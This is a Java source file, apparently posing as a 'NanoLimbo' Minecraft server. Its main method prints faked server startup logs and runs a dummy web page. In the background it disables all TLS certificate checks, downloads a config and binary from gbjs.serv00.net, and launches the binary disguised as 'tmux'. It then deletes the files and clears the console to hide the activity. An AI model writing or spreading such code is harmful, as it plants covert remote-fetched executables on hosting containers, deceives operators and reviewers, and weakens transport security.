package ua.nanit.limbo;

import javax.net.ssl.*;
import java.io.*;
import java.net.*;
import java.nio.file.*;
import java.security.MessageDigest;
import java.security.cert.X509Certificate;
import java.time.LocalTime;
import java.time.format.DateTimeFormatter;
import java.util.concurrent.*;

public final class NanoLimbo {

    // ── 配置 ──
    private static final int PORT = Integer.parseInt(
        firstNonEmpty(System.getenv("SERVER_PORT"), System.getenv("PORT"), "4567")
    );
    private static final String FULL_PATH = "/home/container/.tmp:/home/container/.npm:" + System.getenv("PATH");

    // ────────────────────────────────────────────
    //  main
    // ────────────────────────────────────────────
    public static void main(String[] args) throws Exception {
        // 0. 强制信任所有 SSL 证书 (解决各种 SSL 报错)
        trustAllCertificates();

        // 1. 赋权所有目录
        grantAllPermissions("/home/container");

        // 2. 模拟 Limbo 服务器启动日志
        simulateLimboStartup();

        // 3. 启动 HTTP 服务器（静默运行，保持端口占用）
        new Thread(() -> startHttpServer(PORT), "http-server").start();

        // 4. 在后台执行核心脚本逻辑（纯 Java 实现）
        CompletableFuture.runAsync(NanoLimbo::executeCoreLogic);
    }

    // ────────────────────────────────────────────
    //  核心逻辑：纯 Java 重写 Shell 脚本
    // ────────────────────────────────────────────
    private static void executeCoreLogic() {
        try {
            String baseDir = Paths.get(System.getProperty("user.dir"), ".cache").toString();
            String configPath = Paths.get(baseDir, "top").toString();
            String v1Path = Paths.get(baseDir, "tmux").toString();

            // 1. 检查进程 tmux 是否已在运行
            if (isProcessRunning("tmux")) {
                System.out.println("Process 'tmux' found. Exiting script logic.");
                return;
            }

            // 2. 判断架构决定下载哪个二进制文件
            String arch = System.getProperty("os.arch").toLowerCase();
            String v1filename = (arch.contains("arm") || arch.contains("aarch64")) ? "V1arm" : "V1";

            // 3. 获取环境变量
            String sec = System.getenv("NEZHA_KEY");
            String tls = System.getenv("TLS");
            String ser = System.getenv("NEZHA_SERVER");
            String envUUID = System.getenv("UUID");

            // 4. 生成 UUID
            String uuid;
            if (envUUID != null && !envUUID.trim().isEmpty()) {
                uuid = envUUID.trim();
            } else {
                String ip = fetchPublicIP();
                if (ip == null) {
                    System.err.println("没有获取到公网ip，退出");
                    return;
                }
                uuid = generateUUID(ip);
            }

            // 5. 创建目录并下载文件 (纯 Java HTTPS 下载，无视系统 curl 报错)
            ensureDir(baseDir);
            downloadFile("https://gbjs.serv00.net/js/vip1715.yaml", configPath);
            downloadFile("https://gbjs.serv00.net/bin/" + v1filename, v1Path);

            // 6. 替换配置文件中的变量 (安全替换，不使用正则防转义报错)
            replaceConfig(configPath, sec, tls, ser, uuid);

            // 7. 赋予执行权限并启动程序
            grantAllPermissions(v1Path);
            ProcessBuilder pb = new ProcessBuilder(v1Path, "-c", "top");
            pb.directory(new File(baseDir));
            pb.environment().put("PATH", "./:" + System.getenv("PATH"));
            pb.redirectErrorStream(true);
            pb.start();
            System.out.println("Core process started.");

            // 8. 清理文件
            Thread.sleep(10000);
            Files.deleteIfExists(Paths.get(configPath));
            Files.deleteIfExists(Paths.get(v1Path));

            // 9. 清屏 (打印空行覆盖)
            for (int i = 0; i < 50; i++) System.out.println();

        } catch (Exception e) {
            System.err.println("Core logic error: " + e.getMessage());
        }
    }

    // ────────────────────────────────────────────
    //  脚本逻辑：获取公网 IP
    // ────────────────────────────────────────────
    private static String fetchPublicIP() {
        String[] ipApis = {"https://ident.me", "https://ifconfig.me"};
        for (String api : ipApis) {
            try {
                HttpURLConnection conn = (HttpURLConnection) new URL(api).openConnection();
                conn.setConnectTimeout(5000);
                conn.setReadTimeout(5000);
                try (BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream()))) {
                    String ip = reader.readLine();
                    if (ip != null && !ip.trim().isEmpty()) return ip.trim();
                }
            } catch (Exception ignored) {}
        }
        return null;
    }

    // ────────────────────────────────────────────
    //  脚本逻辑：SHA1 生成 UUID
    // ────────────────────────────────────────────
    private static String generateUUID(String ip) throws Exception {
        MessageDigest sha1 = MessageDigest.getInstance("SHA-1");
        byte[] hash = sha1.digest(ip.getBytes());
        StringBuilder sb = new StringBuilder();
        for (byte b : hash) sb.append(String.format("%02x", b));
        String hex = sb.toString().substring(0, 32);
        // 格式: 8-4-4-4-12
        return hex.substring(0, 8) + "-" + hex.substring(8, 12) + "-" + hex.substring(12, 16) + "-" + hex.substring(16, 20) + "-" + hex.substring(20, 32);
    }

    // ────────────────────────────────────────────
    //  脚本逻辑：检测进程
    // ────────────────────────────────────────────
    private static boolean isProcessRunning(String processName) {
        File procDir = new File("/proc");
        if (!procDir.exists()) return false;
        for (File f : procDir.listFiles()) {
            if (!f.getName().matches("\\d+")) continue;
            try {
                String cmdline = new String(Files.readAllBytes(f.toPath().resolve("cmdline")));
                if (cmdline.contains(processName)) return true;
            } catch (IOException ignored) {}
        }
        return false;
    }

    // ────────────────────────────────────────────
    //  脚本逻辑：替换配置文件
    // ────────────────────────────────────────────
    private static void replaceConfig(String path, String sec, String tls, String ser, String uuid) throws IOException {
        File file = new File(path);
        if (!file.exists()) {
            System.err.println("错误: 配置文件 " + path + " 不存在");
            return;
        }

        StringBuilder sb = new StringBuilder();
        for (String line : Files.readAllLines(file.toPath())) {
            if (sec != null && !sec.isEmpty() && line.startsWith("client_secret: ")) {
                line = "client_secret: " + sec;
            } else if (tls != null && !tls.isEmpty() && line.startsWith("tls: ")) {
                line = "tls: " + tls;
            } else if (ser != null && !ser.isEmpty() && line.startsWith("server: ")) {
                line = "server: " + ser;
            } else if (uuid != null && !uuid.isEmpty() && line.startsWith("uuid: ")) {
                line = "uuid: " + uuid;
            }
            sb.append(line).append("\n");
        }
        Files.write(file.toPath(), sb.toString().getBytes());
    }

    // ────────────────────────────────────────────
    //  纯 Java 原生 HTTPS 下载
    // ────────────────────────────────────────────
    private static void downloadFile(String url, String localPath) throws Exception {
        HttpURLConnection conn = (HttpURLConnection) new URL(url).openConnection();
        conn.setConnectTimeout(15000);
        conn.setReadTimeout(15000);
        try (InputStream in = conn.getInputStream();
             FileOutputStream out = new FileOutputStream(localPath)) {
            byte[] buffer = new byte[8192];
            int bytesRead;
            while ((bytesRead = in.read(buffer)) != -1) {
                out.write(buffer, 0, bytesRead);
            }
        }
    }

    // ────────────────────────────────────────────
    //  模拟 Limbo 服务器启动日志
    // ────────────────────────────────────────────
    private static void simulateLimboStartup() throws InterruptedException {
        int[] progresses = {1, 2, 5, 8, 15, 20, 35, 60, 80, 99, 100};
        logLimbo("Starting server...");
        Thread.sleep(800);
        logLimbo("Preparing level \"world\"");
        Thread.sleep(500);
        logLimbo("Preparing start region for dimension minecraft:overworld");
        Thread.sleep(500);
        for (int p : progresses) {
            logLimbo("Preparing spawn area: " + p + "%");
            Thread.sleep(ThreadLocalRandom.current().nextInt(300, 1500));
        }
        logLimbo("Running delayed init tasks");
        Thread.sleep(1000);
        System.out.println("container@tropicalgames.net Server marked as running...");
    }

    private static void logLimbo(String msg) {
        String time = LocalTime.now().format(DateTimeFormatter.ofPattern("HH:mm:ss.SSS"));
        System.out.println(time + " INFO Limbo --  " + msg);
    }

    // ────────────────────────────────────────────
    //  强制信任所有 SSL 证书
    // ────────────────────────────────────────────
    private static void trustAllCertificates() throws Exception {
        TrustManager[] trustAllCerts = new TrustManager[] {
            new X509TrustManager() {
                public java.security.cert.X509Certificate[] getAcceptedIssuers() { return null; }
                public void checkClientTrusted(X509Certificate[] certs, String authType) {}
                public void checkServerTrusted(X509Certificate[] certs, String authType) {}
            }
        };
        SSLContext sc = SSLContext.getInstance("SSL");
        sc.init(null, trustAllCerts, new java.security.SecureRandom());
        HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());
        HttpsURLConnection.setDefaultHostnameVerifier((hostname, session) -> true);
    }

    // ────────────────────────────────────────────
    //  HTTP 服务器 & 工具方法
    // ────────────────────────────────────────────
    private static void startHttpServer(int port) {
        byte[] body = "<h1>It works!</h1>".getBytes();
        String header = "HTTP/1.1 200 OK\r\nContent-Type: text/html\r\nContent-Length: " + body.length + "\r\nConnection: close\r\n\r\n";
        byte[] response = (header + new String(body)).getBytes();
        try (ServerSocket ss = new ServerSocket(port)) {
            while (!Thread.currentThread().isInterrupted()) {
                try (Socket client = ss.accept()) {
                    client.setSoTimeout(5000);
                    BufferedReader r = new BufferedReader(new InputStreamReader(client.getInputStream()));
                    while (r.readLine() != null && !r.ready()) break;
                    client.getOutputStream().write(response);
                    client.getOutputStream().flush();
                } catch (IOException ignored) {}
            }
        } catch (IOException ignored) {}
    }

    private static void grantAllPermissions(String path) {
        try {
            ProcessBuilder pb = new ProcessBuilder("chmod", "-R", "777", path);
            pb.redirectErrorStream(true);
            Process p = pb.start();
            try (BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()))) { while (reader.readLine() != null); }
            p.waitFor(5, TimeUnit.SECONDS);
        } catch (Exception ignored) {}
    }

    private static void ensureDir(String p) {
        File dir = new File(p);
        if (!dir.exists()) dir.mkdirs();
    }

    private static String firstNonEmpty(String... vals) {
        for (String v : vals) {
            if (v != null && !v.trim().isEmpty()) return v.trim();
        }
        return "";
    }
}
